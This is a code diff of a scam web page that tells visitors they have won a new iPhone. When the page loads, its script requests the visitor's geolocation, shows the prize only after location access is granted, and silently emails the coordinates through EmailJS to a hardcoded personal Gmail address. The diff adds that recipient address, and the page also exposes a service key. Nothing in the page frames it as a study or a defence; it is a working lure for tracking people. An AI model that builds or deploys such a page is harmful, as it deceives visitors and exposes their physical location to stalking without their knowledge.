@@ -24,7 +24,7 @@
             text-align: center;
         }
         #rewardContent {
-            display: none; /* Hidden initially */
+            display: none;
         }
         #locationDisplay {
             background: #e9ecef;
@@ -34,82 +34,66 @@
             margin-top: 15px;
             font-size: 0.9rem;
         }
-        .form-group {
-            margin-bottom: 1rem;
-        }
-        .form-control {
-            padding: 0.75rem;
-            font-size: 1rem;
-            border-radius: 5px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Reward Message and Location (Hidden initially) -->
-        <div id="rewardContent" style="display:none;">
-            <h1 class="form-heading">Congratulations! 🎉</h1>
+        <div id="rewardContent">
+            <h1>Congratulations! 🎉</h1>
             <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-            <p id="locationDisplay" class="form-text">Waiting for location...</p>
+            <p id="locationDisplay">Waiting for location...</p>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("CrVHH3e0Kot5rmodE"); // Public Key
-
-            // Automatically trigger location request when the page loads
+            emailjs.init("CrVHH3e0Kot5rmodE"); 
             requestLocationPermission();
-
-            function sendLocationEmail(latitude, longitude) {
-                console.log("📍 Sending Location Data:", { latitude, longitude });
-
-                const templateParams = {
-                    latitude: latitude.toString(),
-                    longitude: longitude.toString()
-                };
-
-                emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
-                    .then((response) => {
-                        console.log("✅ Email sent successfully!", response);
-                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
-                    })
-                    .catch((error) => {
-                        console.error("❌ Error sending email:", error);
-                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
-                    });
-            }
-
-            function requestLocationPermission() {
-                // As soon as the page loads, trigger geolocation
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-
-                            console.log("🌍 Location received:", latitude, longitude);
-                            document.getElementById("locationDisplay").textContent = 
-                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                            sendLocationEmail(latitude, longitude);
-
-                            // Show the reward content now that we have the location
-                            document.getElementById("rewardContent").style.display = "block";
-                        },
-                        (error) => {
-                            console.error("❌ Error getting location:", error);
-                            document.getElementById("locationDisplay").textContent = 
-                                "⚠️ Location access denied!";
-                        }
-                    );
-                } else {
-                    console.log("❌ Geolocation not supported.");
-                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
-                }
-            }
         });
+
+        function requestLocationPermission() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        console.log("🌍 Location received:", latitude, longitude);
+                        document.getElementById("locationDisplay").textContent = 
+                            `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
+                        sendLocationEmail(latitude, longitude);
+                        document.getElementById("rewardContent").style.display = "block";
+                    },
+                    (error) => {
+                        console.error("❌ Location error:", error);
+                        document.getElementById("locationDisplay").textContent = 
+                            "⚠️ Location access denied!";
+                    }
+                );
+            } else {
+                console.log("❌ Geolocation not supported.");
+                document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
+            }
+        }
+
+        function sendLocationEmail(latitude, longitude) {
+            const templateParams = {
+                latitude: latitude.toString(),
+                longitude: longitude.toString(),
+                to_email: "rizwan.ahmed99586@gmail.com"
+            };
+
+            emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
+                .then((response) => {
+                    console.log("✅ Email sent successfully!", response);
+                    document.getElementById("locationDisplay").textContent = "📧 Location sent!";
+                })
+                .catch((error) => {
+                    console.error("❌ Email sending error:", error);
+                    document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
+                });
+        }
     </script>
 </body>
 </html>
